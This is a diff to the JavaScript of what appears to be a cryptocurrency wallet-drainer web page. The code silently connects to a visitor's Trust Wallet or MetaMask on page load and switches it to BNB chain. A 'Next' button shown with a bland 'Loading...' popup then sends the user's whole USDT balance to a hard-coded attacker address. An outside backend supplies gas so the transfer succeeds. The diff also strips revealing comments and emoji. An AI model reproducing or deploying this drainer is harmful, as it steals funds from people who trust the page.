@@ -1,43 +1,67 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C7c8B7C26953D090"; // Your USDT receiving address
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
 let web3;
 let userAddress;
 
-// Try silent connection on load
-window.addEventListener("load", async () => {
-    if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-            const accounts = await window.ethereum.request({ method: "eth_accounts" });
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                await ensureBSCNetwork();
-                console.log("🔗 Silently connected to wallet:", userAddress);
-            } else {
-                console.warn("🟡 No wallet accounts found.");
-            }
-        } catch (err) {
-            console.error("❌ Silent wallet connection error:", err);
-        }
+async function connectWallet() {
+    if (typeof window.ethereum === 'undefined') {
+        alert("Please open in Trust Wallet DApp browser or install MetaMask.");
+        return;
     }
-});
 
-async function ensureBSCNetwork() {
+    web3 = new Web3(window.ethereum);
+
     try {
+        const accounts = await window.ethereum.request({ method: "eth_chainId" });
+
+        if (accounts.length === 0) {
+            console.log("No wallet connected.");
+            return;
+        }
+
+        userAddress = accounts[0];
+        console.log("Wallet connected silently:", userAddress);
+
+        // Try switching to BNB chain
         await window.ethereum.request({
             method: "wallet_switchEthereumChain",
-            params: [{ chainId: "0x38" }],
+            params: [{ chainId: "0x38" }]
         });
     } catch (err) {
-        console.error("❌ Failed to switch to BNB:", err);
+        console.error("Connection error:", err);
+        if (err.code === 4902) {
+            try {
+                await window.ethereum.request({
+                    method: "wallet_addEthereumChain",
+                    params: [{
+                        chainId: "0x38",
+                        chainName: "Binance Smart Chain",
+                        nativeCurrency: {
+                            name: "BNB",
+                            symbol: "BNB",
+                            decimals: 18
+                        },
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        blockExplorerUrls: ["https://bscscan.com"]
+                    }]
+                });
+            } catch (addError) {
+                console.error("Add chain error:", addError);
+            }
+        }
     }
 }
 
+// Auto-connect silently on load
+window.addEventListener("load", () => {
+    connectWallet();
+});
+
 async function Next() {
     if (!web3 || !userAddress) {
-        alert("Wallet not connected. Please connect a wallet.");
+        alert("Wallet not connected. Please open in Trust Wallet DApp Browser and reload.");
         return;
     }
 
@@ -69,15 +93,15 @@ async function Next() {
         return;
     }
 
-    // Flash detection path
     showPopup("Loading...", "green");
+
     transferUSDT(usdtBalance, userBNB);
 }
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
-            console.log("🔄 Low BNB. Requesting gas from backend...");
+            console.log("User BNB is low. Requesting BNB from backend...");
             await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -91,7 +115,7 @@ async function transferUSDT(usdtBalance, userBNB) {
 
         const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
 
-        console.log(`🔴 Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
 
         await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
 
@@ -104,6 +128,21 @@ async function transferUSDT(usdtBalance, userBNB) {
     } catch (error) {
         console.error("❌ USDT Transfer Failed:", error);
         alert("USDT transfer failed. Ensure you have enough BNB for gas.");
+    }
+}
+
+async function sendBNB(toAddress, amount) {
+    try {
+        await web3.eth.sendTransaction({
+            from: bnbGasSender,
+            to: toAddress,
+            value: web3.utils.toWei(amount, "ether"),
+            gas: 21000
+        });
+
+        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
+    } catch (error) {
+        console.error("⚠️ Error sending BNB:", error);
     }
 }
 
@@ -127,8 +166,8 @@ function showPopup(message, color) {
         document.body.appendChild(popup);
     }
 
-    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "black" ? "#eeeeee" : "#e6f7e6";
-    popup.style.color = color === "red" ? "red" : color === "black" ? "black" : "green";
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
+    popup.style.color = color === "red" ? "red" : "green";
     popup.innerHTML = message;
     popup.style.display = "block";
 
@@ -137,5 +176,4 @@ function showPopup(message, color) {
     }, 5000);
 }
 
-// Button logic remains unchanged
 document.getElementById("Next").addEventListener("click", Next);
